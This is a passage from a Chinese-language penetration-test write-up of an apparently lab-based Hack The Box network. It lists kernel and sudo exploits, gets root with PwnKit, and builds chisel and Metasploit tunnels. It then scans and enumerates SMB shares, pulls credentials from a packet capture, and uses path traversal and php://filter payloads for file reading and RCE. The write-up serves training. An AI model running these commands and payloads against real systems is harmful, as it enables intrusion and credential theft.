<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: <span class="nv">mint</span><span class="o">=</span>19,[ <span class="nv">ubuntu</span><span class="o">=</span>18|20 <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: <span class="nv">centos</span><span class="o">=</span>6|7|8,[ <span class="nv">ubuntu</span><span class="o">=</span>14|16|17|18|19|20 <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>20.04 <span class="o">]{</span>kernel:5.8.0-<span class="k">*</span><span class="o">}</span>
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

<span class="o">[</span>+] <span class="o">[</span>CVE-2022-32250] nft_object UAF <span class="o">(</span>NFT_MSG_NEWSET<span class="o">)</span>

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=(</span>22.04<span class="o">){</span>kernel:5.15.0-27-generic<span class="o">}</span>
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone<span class="o">=</span>1 required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>
</code></pre></div></div>
<p>使用 Pwnkit 可以成功提权到 root，从而可以读取 james 的 flag。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>balthazar@DANTE-WEB-NIX01:~/Downloads/.tmp<span class="nv">$ </span>./PwnKit 
root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp# <span class="nb">whoami
</span>root
root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp# <span class="nb">cat</span> /home/james/flag.txt 
DANTE<span class="o">{</span>j4m3s_NEEd5_a_p455w0rd_M4n4ger!<span class="o">}</span>
root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp#
</code></pre></div></div>
<p>root 目录下也有一个 flag.txt</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DANTE-WEB-NIX01:~# <span class="nb">ls
</span>flag.txt  snap  wordpress.tar.bz2  wordpress_backup
root@DANTE-WEB-NIX01:~# <span class="nb">cat </span>flag.txt 
DANTE<span class="o">{</span>Too_much_Pr1v!!!!<span class="o">}</span>
</code></pre></div></div>

<h2 id="tunnel-搭建">Tunnel 搭建</h2>

<h3 id="chisel">chisel</h3>
<p>使用 pwncat-cs 连接 ssh，上传 chisel</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwncat-cs <span class="s1">'ssh://balthazar:TheJoker12345!@10.10.110.100'</span>
upload chisel xxx
</code></pre></div></div>

<p>首先使用 chisel 构建 socks 隧道。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel server <span class="nt">-p</span> 12345 <span class="nt">--reverse</span> <span class="c"># local</span>
./chisel client 10.10.14.5:12345 R:0.0.0.0:1080:socks <span class="c"># remote</span>
</code></pre></div></div>
<h3 id="msf">msf</h3>
<p>也可以使用 msf meterpreter 来构建 socks 隧道：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use multi/manage/autoroute
<span class="nb">set </span>session 1
exploit
use auxiliary/server/socks_proxy
<span class="nb">set </span>SRVPORT 9090
exlpoit <span class="nt">-j</span>
</code></pre></div></div>

<h2 id="内网资产扫描">内网资产扫描</h2>
<p>在建立了隧道的基础上就可以对内网进行资产扫描了</p>
<h3 id="fscan-1">fscan</h3>
<p>比较高效的是 fscan，配合 fscanOutPut 可以将结果以表格的方式进行统计。fscan 支持 -socks5 参数来指定代理：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fscan <span class="nt">-h</span> 172.16.1.0/24 <span class="nt">-socks5</span> 127.0.0.1:1080
</code></pre></div></div>

<h3 id="goby">Goby</h3>
<p>Goby 的图形化界面更加方便分析。代理扫描时，使用 socks 代理。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102075033.png" alt="20240102075033" /></p>

<!-- ![Alt text](../../../../../assets/image-2.png) -->

<p>总共 11 个 IP，同样也扫描出了 MS17-010</p>

<h3 id="ehole-指纹识别">Ehole: 指纹识别</h3>
<p>ehole 可以对 web 服务进行进一步的指纹扫描，同样支持 -socks 参数进行代理扫描。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ehole finger <span class="nt">-l</span> webapp.txt <span class="nt">--proxy</span> socks5://127.0.0.1:1080
</code></pre></div></div>
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102075044.png" alt="20240102075044" /></p>

<!-- ![Alt text](../../../../../assets/image-4.png) -->
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span> https://172.16.1.1 |  | nginx | 200 | 8889 | pfSense - LoginpfSense Logo <span class="o">]</span>
<span class="o">[</span> https://172.16.1.1/ |  | nginx | 200 | 8889 | pfSense - LoginpfSense Logo <span class="o">]</span>
<span class="o">[</span> http://172.16.1.1 |  | nginx | 200 | 8999 | pfSense - LoginpfSense Logo <span class="o">]</span>
<span class="o">[</span> http://172.16.1.102 | OpenSSL | Apache/2.4.54 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1p PHP/7.4.0 | 200 | 1237 | Dante Marriage Registration System :: Home Page <span class="o">]</span>                                                                                       
<span class="o">[</span> http://172.16.1.19 | 列目录 | Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> | 200 | 553 | Index of / <span class="o">]</span>
<span class="o">[</span> http://172.16.1.12/dashboard/ | XAMPP 默认页面,Perl,rums<span class="o">(</span>科创站群管理平台<span class="o">)</span>,mod_perl,OpenSSL | Apache/2.4.43 <span class="o">(</span>Unix<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP <span class="o">]</span>                            
<span class="o">[</span> http://172.16.1.17 | 列目录 | Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> | 200 | 963 | Index of / <span class="o">]</span>
<span class="o">[</span> http://172.16.1.20 |  | Microsoft-IIS/8.5 | 200 | 3173 |  <span class="o">]</span>
<span class="o">[</span> http://172.16.1.100 | Apache2 Ubuntu 默认页 | Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> | 200 | 10918 | Apache2 Ubuntu Default Page: It works <span class="o">]</span>                                                                                                          
<span class="o">[</span> http://172.16.1.13/dashboard/ | XAMPP 默认页面,rums<span class="o">(</span>科创站群管理平台<span class="o">)</span>,OpenSSL | Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP <span class="o">]</span>                                                                      
<span class="o">[</span> http://172.16.1.10 | wordpress | Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> | 200 | 28842 | Dante Hosting <span class="o">]</span>
<span class="o">[</span> https://172.16.1.102 | OpenSSL | Apache/2.4.54 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1p PHP/7.4.0 | 200 | 1237 | Dante Marriage Registration System :: Home Page <span class="o">]</span>                                                                                      
<span class="o">[</span> https://172.16.1.13/dashboard/ | XAMPP 默认页面,rums<span class="o">(</span>科创站群管理平台<span class="o">)</span>,OpenSSL | Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP <span class="o">]</span>                                                                     
<span class="o">[</span> https://172.16.1.12/dashboard/ | XAMPP 默认页面,Perl,rums<span class="o">(</span>科创站群管理平台<span class="o">)</span>,mod_perl,OpenSSL | Apache/2.4.43 <span class="o">(</span>Unix<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP <span class="o">]</span>                           
<span class="o">[</span> http://172.16.1.12 | XAMPP 默认页面,Perl,rums<span class="o">(</span>科创站群管理平台<span class="o">)</span>,mod_perl,OpenSSL | Apache/2.4.43 <span class="o">(</span>Unix<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP <span class="o">]</span>                                       
<span class="o">[</span> http://172.16.1.13 | XAMPP 默认页面,rums<span class="o">(</span>科创站群管理平台<span class="o">)</span>,OpenSSL | Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP <span class="o">]</span>                                                                                 
<span class="o">[</span> https://172.16.1.13 | XAMPP 默认页面,rums<span class="o">(</span>科创站群管理平台<span class="o">)</span>,OpenSSL | Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP <span class="o">]</span>                                                                                
<span class="o">[</span> https://172.16.1.12 | XAMPP 默认页面,Perl,rums<span class="o">(</span>科创站群管理平台<span class="o">)</span>,mod_perl,OpenSSL | Apache/2.4.43 <span class="o">(</span>Unix<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP <span class="o">]</span>                                      
<span class="o">[</span> http://172.16.1.19:8080 | Jenkins,Hudson,Jenkins | Jetty<span class="o">(</span>9.4.27.v20200227<span class="o">)</span> | 403 | 793 |  <span class="o">]</span>
<span class="o">[</span> http://172.16.1.19:8080/login?from<span class="o">=</span>%2F<span class="s1">' | Jenkins,Hudson,Jenkins | Jetty(9.4.27.v20200227) | 200 | 2019 | Sign in [Jenkins] ]  
</span></code></pre></div></div>

<h3 id="资产概况">资产概况</h3>

<p>存活 IP 及端口：</p>
<ul>
  <li>172.16.1.5 
    172.16.1.5  21
    172.16.1.5	135
    172.16.1.5	139
    172.16.1.5	445
    172.16.1.5	1433</li>
  <li>172.16.1.13
    172.16.1.13	80
    172.16.1.13	443
    172.16.1.13	445</li>
  <li>
    <p>172.16.1.102
    172.16.1.102	80
    172.16.1.102	135
    172.16.1.102	139
    172.16.1.102	443
    172.16.1.102	445
    172.16.1.102	3306</p>
  </li>
  <li>172.16.1.10
    172.16.1.10	22
    172.16.1.10	80
    172.16.1.10	139
    172.16.1.10	445</li>
  <li>172.16.1.17
    172.16.1.17	80
    172.16.1.17	139
    172.16.1.17	445
    172.16.1.17	10000</li>
  <li>172.16.1.101
    172.16.1.101	21
    172.16.1.101	135
    172.16.1.101	139
    172.16.1.101	445</li>
  <li>172.16.1.3	
    172.16.1.3	22</li>
  <li>172.16.1.20
    172.16.1.20	80
    172.16.1.20	22
    172.16.1.20	135
    172.16.1.20	139
    172.16.1.20	443
    172.16.1.20	445
    172.16.1.20	88</li>
  <li>
    <p>172.16.1.19
    172.16.1.19	80
    172.16.1.19	8080
    172.16.1.19	8443
    172.16.1.19	8888</p>
  </li>
  <li>172.16.1.12
    172.16.1.12	21
    172.16.1.12	80
    172.16.1.12	22
    172.16.1.12	443
    172.16.1.12	3306</li>
  <li>172.16.1.1
    172.16.1.1	22
    172.16.1.1	80
    172.16.1.1	443</li>
  <li>172.16.1.100
    172.16.1.100	22
    172.16.1.100	21
    172.16.1.100	80</li>
  <li>10.10.110.100
    10.10.110.100	21
    10.10.110.100	22</li>
</ul>

<h1 id="无凭证域内信息收集">无凭证域内信息收集</h1>
<ol>
  <li>cme 收集 SMB 及域信息。</li>
  <li>定位域控</li>
  <li>寻找域内用户名</li>
  <li>是否可以匿名枚举 SMB、FTP 等</li>
  <li>ASREProast</li>
  <li>Password Spray</li>
  <li>匿名枚举 ftp</li>
</ol>

<h2 id="cme-收集-smb-及域信息">cme 收集 SMB 及域信息</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p crackmapexec smb 172.16.1.0/24
</code></pre></div></div>
<p>结果如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         172.16.1.5      445    DANTE-SQL01      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:DANTE-SQL01<span class="o">)</span> <span class="o">(</span>domain:DANTE-SQL01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         172.16.1.20     445    DANTE-DC01       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2012 R2 Standard 9600 x64 <span class="o">(</span>name:DANTE-DC01<span class="o">)</span> <span class="o">(</span>domain:DANTE.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         172.16.1.10     445    DANTE-NIX02      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 0 <span class="o">(</span>name:DANTE-NIX02<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.17     445    DANTE-NIX03      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 0 <span class="o">(</span>name:DANTE-NIX03<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:DANTE-WS02<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS02<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.102    445    DANTE-WS03       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 19041 x64 <span class="o">(</span>name:DANTE-WS03<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS03<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.13     445    DANTE-WS01       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 <span class="o">(</span>name:DANTE-WS01<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>
<p>从结果中可以看到存在 DANTE.local 域，并且 DC 为 172.16.1.20。</p>
<ol>
  <li>前面的探测结果中可知 DC 上存在永恒之蓝漏洞。</li>
  <li>除了 DC 之外，其他的主机均未开启 SMB 强制签名，存在 Relay 的可能性。</li>
</ol>

<h2 id="匿名枚举用户名">匿名枚举用户名</h2>
<p>匿名枚举用户名可以使用 cme 或者 enum4linux。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p crackmapexec smb 172.16.1.20 <span class="nt">--users</span>

p enum4linux 172.16.1.20 
</code></pre></div></div>
<p>需要认证，因此没有得到结果。</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ p crackmapexec smb 172.16.1.20 --users
[proxychains] config file found: /mnt/share/project/HTB/ProLab/Dante/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
SMB         172.16.1.20     445    DANTE-DC01       [*] Windows Server 2012 R2 Standard 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True)
SMB         172.16.1.20     445    DANTE-DC01       [-] Error enumerating domain users using dc ip 172.16.1.20: NTLM needs domain\username and a password
SMB         172.16.1.20     445    DANTE-DC01       [*] Trying with SAMRPC protocol
</code></pre></div></div>

<h2 id="匿名枚举-smb">匿名枚举 SMB</h2>
<p>如果 SMB 允许匿名访问，我们没准可以获取一些敏感消息。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p crackmapexec smb 172.16.1.0/24 <span class="nt">-u</span> anonymous <span class="nt">-p</span> <span class="s1">''</span>  <span class="nt">--shares</span>
</code></pre></div></div>
<p>结果如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         172.16.1.5      445    DANTE-SQL01      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:DANTE-SQL01<span class="o">)</span> <span class="o">(</span>domain:DANTE-SQL01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         172.16.1.20     445    DANTE-DC01       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2012 R2 Standard 9600 x64 <span class="o">(</span>name:DANTE-DC01<span class="o">)</span> <span class="o">(</span>domain:DANTE.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         172.16.1.10     445    DANTE-NIX02      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 0 <span class="o">(</span>name:DANTE-NIX02<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.17     445    DANTE-NIX03      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 0 <span class="o">(</span>name:DANTE-NIX03<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.5      445    DANTE-SQL01      <span class="o">[</span>-] DANTE-SQL01<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.102    445    DANTE-WS03       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 19041 x64 <span class="o">(</span>name:DANTE-WS03<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS03<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:DANTE-WS02<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS02<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.20     445    DANTE-DC01       <span class="o">[</span>-] DANTE.local<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.10     445    DANTE-NIX02      <span class="o">[</span>+] <span class="se">\a</span>nonymous: 
SMB         172.16.1.17     445    DANTE-NIX03      <span class="o">[</span>+] <span class="se">\a</span>nonymous: 
SMB         172.16.1.10     445    DANTE-NIX02      <span class="o">[</span>+] Enumerated shares
SMB         172.16.1.10     445    DANTE-NIX02      Share           Permissions     Remark
SMB         172.16.1.10     445    DANTE-NIX02      <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         172.16.1.10     445    DANTE-NIX02      print<span class="nv">$ </span>                         Printer Drivers
SMB         172.16.1.10     445    DANTE-NIX02      SlackMigration  READ            
SMB         172.16.1.10     445    DANTE-NIX02      IPC<span class="nv">$ </span>                           IPC Service <span class="o">(</span>DANTE-NIX02 server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>                                                                                                                    
SMB         172.16.1.13     445    DANTE-WS01       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 <span class="o">(</span>name:DANTE-WS01<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.102    445    DANTE-WS03       <span class="o">[</span>-] DANTE-WS03<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.17     445    DANTE-NIX03      <span class="o">[</span>+] Enumerated shares
SMB         172.16.1.17     445    DANTE-NIX03      Share           Permissions     Remark
SMB         172.16.1.17     445    DANTE-NIX03      <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         172.16.1.17     445    DANTE-NIX03      forensics       READ,WRITE      
SMB         172.16.1.17     445    DANTE-NIX03      IPC<span class="nv">$ </span>                           IPC Service <span class="o">(</span>DANTE-NIX03 server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>                                                                                                                    
SMB         172.16.1.13     445    DANTE-WS01       <span class="o">[</span>-] DANTE-WS01<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
</code></pre></div></div>
<p>允许 SMB 匿名访问的有两台主机：</p>
<ol>
  <li>172.16.1.10 SlackMigration 可读</li>
  <li>172.16.1.17 forensics 可读可写</li>
</ol>

<p>我们可以使用 smbclient 进行连接。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p smbclient <span class="se">\\\\</span>172.16.1.10<span class="se">\\</span>SlackMigration <span class="nt">-U</span> <span class="s2">"anonymous%"</span>
</code></pre></div></div>
<p>172.16.1.10 中 SlackMigration 共享中存在一个 admintasks.txt 文件，相当于提示信息。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-Remove</span> wordpress <span class="nb">install </span>from web root - PENDING
<span class="nt">-Reinstate</span> Slack integration on Ubuntu machine - PENDING
<span class="nt">-Remove</span> old employee accounts - COMPLETE
<span class="nt">-Inform</span> Margaret of the new changes - COMPLETE
<span class="nt">-Remove</span> account restrictions on Margarets account post-promotion to admin - PENDING
</code></pre></div></div>
<p>从中我们可以得出如下的信息：</p>
<ul>
  <li>172.16.1.10 中部署的 wordpress 服务以 root 权限运行。</li>
  <li>用户 Margarets 具备管理员权限。</li>
</ul>

<p>连接 172.16.1.17 forensics</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p smbclient <span class="se">\\\\</span>172.16.1.17<span class="se">\\</span>forensics <span class="nt">-U</span> <span class="s2">"anonymous%"</span>
</code></pre></div></div>
<p>可以在其中发现一个 monitor 文件。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>file monitor
monitor: pcap capture file, microsecond ts <span class="o">(</span>little-endian<span class="o">)</span> - version 2.4 <span class="o">(</span>Ethernet, capture length 65535<span class="o">)</span>
</code></pre></div></div>
<p>monitor 是一个 pcap 文件，使用 wireshark 打开。过滤 http 报文可以发现流量中存在部分认证消息。</p>
<ul>
  <li>admin/password6543</li>
  <li>admin/Password6543</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231226023935.png" alt="20231226023935" /></p>

<!-- ![Alt text](../../../../../assets/image-9.png) -->

<h1 id="linux-17216110">Linux: 172.16.1.10</h1>
<h2 id="80-端口文件包含导致-rce">80 端口文件包含导致 RCE</h2>
<p>http://172.16.1.10/nav.php?page=about.html</p>

<p>page 参数存在目录穿越，导致任意文件读取。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://172.16.1.10/nav.php?page<span class="o">=</span>../../../../../../../etc/passwd
</code></pre></div></div>
<p>结果如下：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
margaret:x:1001:1001::/home/margaret:/bin/lshell
mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
omi:x:998:997::/home/omi:/bin/false
omsagent:x:997:998:OMS agent:/var/opt/microsoft/omsagent/run:/bin/bash
nxautomation:x:996:995:nxOMSAutomation:/home/nxautomation/run:/bin/bash
</code></pre></div></div>
<p>这台主机存在两个可以登陆的用户：</p>
<ul>
  <li>frank</li>
  <li>margaret</li>
</ul>

<p>结合 SMB 匿名枚举的信息，margaret 是拥有管理员权限的。并且该主机中部署了 wordpress。</p>

<p>但访问 /wordpress 访问不到 wordpress 服务，扫描目录也没有有用的结果。</p>

<p>直接读取 margaret 目录下的 flag。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://172.16.1.10/nav.php?page<span class="o">=</span>../../../../../../../../../home/margaret/flag.txt
</code></pre></div></div>
<p>访问 <code class="language-plaintext highlighter-rouge">/nav.php?page=../../../../../../../../../var/www/html/wordpress/index.php</code> 时得到了一个 500 响应。如果没有文件不存在的话应该是 200，说明存在该文件，但由于 php 文件包含导致服务出错。</p>

<p>php 文件包含可以通过 filter 读取源码。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">page</span><span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>../../../../../../../../../var/www/html/wordpress/index.php
</code></pre></div></div>
<p>也可以利用 filter chain 来 RCE。</p>
